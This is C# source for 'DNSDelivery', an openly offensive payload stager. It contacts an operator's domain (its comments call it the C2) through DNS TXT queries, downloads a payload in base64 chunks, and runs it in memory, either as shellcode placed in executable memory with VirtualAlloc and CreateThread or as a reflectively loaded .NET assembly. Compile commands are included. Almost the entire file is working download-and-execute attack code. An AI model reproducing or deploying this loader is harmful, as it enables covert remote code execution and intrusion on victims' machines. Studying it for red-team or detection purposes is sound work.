/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:dnsdelivery.exe *.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /define:DEBUG /out:dnsdelivery.exe *.cs

*/

using System;
using System.Text;
using System.Reflection;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace DNSDelivery
{
	//============================================================================================
	// Dumb static class to hold all program main parameters
	//============================================================================================
	static class PARAM
	{
		public static string domainName = "YOUR_DOMAIN_NAME_HERE";
		public static string serverName = null; // This must be set to 'null' to use the default system's DNS servers
	}
	
	//============================================================================================
	//
	//============================================================================================
    class Program
    {
		public static string Base64Encode(string plainText)
		{
			var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
			return System.Convert.ToBase64String(plainTextBytes);
		}

		//------------------------------------------------------------------------------------
		// Get data from the DNS server
		//------------------------------------------------------------------------------------
		private static string GetData (string request)
		{
			StringBuilder response = new StringBuilder();
#if (DEBUG)			
			Console.WriteLine("Sending request: {0}",request + "." + PARAM.domainName);
#endif
			try
			{
				// Loop through each available records and merge them into one string
				foreach (string txtRecord in DnsResolver.GetTXTRecords(request + "." + PARAM.domainName,PARAM.serverName))
				{
					response.Append(txtRecord);
				}
			}
			catch {
				return null;
			}
			return response.ToString();
		}
		
		//------------------------------------------------------------------------------------
		// MAIN FUNCTION
		//------------------------------------------------------------------------------------
        public static void Main()
        {
			//------------------------------------------------------------
			// Initialization step 
			// Contact the C2 over DNS channel, and ask what will be delivered:
			// - type of payload: can be a shellcode or a .Net assembly
			// - the number of chunks that constitute the payload
			
			// Contact the DNS C2 and perform initial request which is basically: "what do you have for me ?"
			string init = GetData("init");
			
			if (init == null) {
				// Error performing DNS request
				return;
			}
			
			// The received string is base64 encoded, let's decode it
			string[] result = Encoding.ASCII.GetString(Convert.FromBase64String(init)).Split('|');
			string type = result[0];
			int nbChunk;			
			if (!Int32.TryParse(result[1], out nbChunk))
                return;
#if (DEBUG)			
			Console.WriteLine("Type:{0}\nNb of chunks:{1}",type, nbChunk);
#endif 
			//------------------------------------------------------------
			// At this stage we know how much chunks of data should be downloaded
			// Let's download all chunks of data and merge them
			
			StringBuilder encodedPayload = new StringBuilder();
			string request = String.Empty;
			string tmp = String.Empty;
			int i = 0;
			
			while (i < nbChunk)
			{
				request = String.Format("{0}",i);
				tmp = GetData(request);
				if (tmp != null) {
					Console.WriteLine("Received chunk #{0}",i);
					encodedPayload.Append(tmp);
					i++;
				}
			}
#if (DEBUG)				
			Console.WriteLine("Whole data received:\n[{0}]",encodedPayload.ToString());
#endif 			
			//---------------------------------------------------------------------------------
			// Convert base64 data received back to byte array
			byte[] data = Convert.FromBase64String(encodedPayload.ToString());
			
			//---------------------------------------------------------------------------------
			// The data received is a shellcode
			if (type == "shellcode")
			{
				//---------------------------------------------------------------------------------
				// Copy decrypted shellcode to memory and execute it
				UInt32 funcAddr = VirtualAlloc(0, (UInt32)data.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				Marshal.Copy(data, 0, (IntPtr)(funcAddr), data.Length);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;

				// prepare data
				IntPtr pinfo = IntPtr.Zero;

				// execute native code
				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
				WaitForSingleObject(hThread, 0xFFFFFFFF);
				return;
			}
			//---------------------------------------------------------------------------------
			// The data received is a .Net assembly
			else if (type == "assembly")
			{
				Assembly a = Assembly.Load(data);
      			MethodInfo method = a.EntryPoint;
      			object o = a.CreateInstance(method.Name);
      			method.Invoke(o, null);
			}
		}
		
		private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds);
	}
}